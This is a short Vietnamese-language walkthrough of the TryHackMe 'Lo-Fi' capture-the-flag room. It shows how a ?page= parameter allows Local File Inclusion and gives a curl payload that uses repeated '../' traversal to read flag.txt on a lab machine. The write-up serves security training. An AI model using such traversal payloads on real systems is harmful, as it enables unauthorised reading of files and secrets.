+++
title = "TryHackMe: Lo-Fi"
date = 2025-01-25
description = "Walkthrough challenge Lo-Fi trên TryHackMe — Local File Inclusion (LFI)."
[taxonomies]
tags = ["ctf", "tryhackme", "lfi", "file-inclusion"]
[extra]
toc = true
+++

Walkthrough challenge **Lo-Fi** trên TryHackMe — exploit **Local File Inclusion (LFI)**.

<!-- more -->

Link: [https://tryhackme.com/room/lofi](https://tryhackme.com/room/lofi)

Keyword: LFI, File Inclusion

## Phân tích

Xem source code, phát hiện path đến các PHP page:

```html
<li><a href="/?page=relax.php">Relax</a></li>
<li><a href="/?page=sleep.php">Sleep</a></li>
<li><a href="/?page=chill.php">Chill</a></li>
<li><a href="/?page=coffee.php">Coffee</a></li>
<li><a href="/?page=vibe.php">Vibe</a></li>
<li><a href="/?page=game.php">Game</a></li>
```

## Khai thác

Ý tưởng rất đơn giản: dùng `../` để cd lên parent folder. Không cần lo số lượng `../` vì root folder có parent là chính nó.

Payload:

```bash
curl 10.10.253.144/?page=../../../../../../flag.txt
```

Vậy thôi 😄
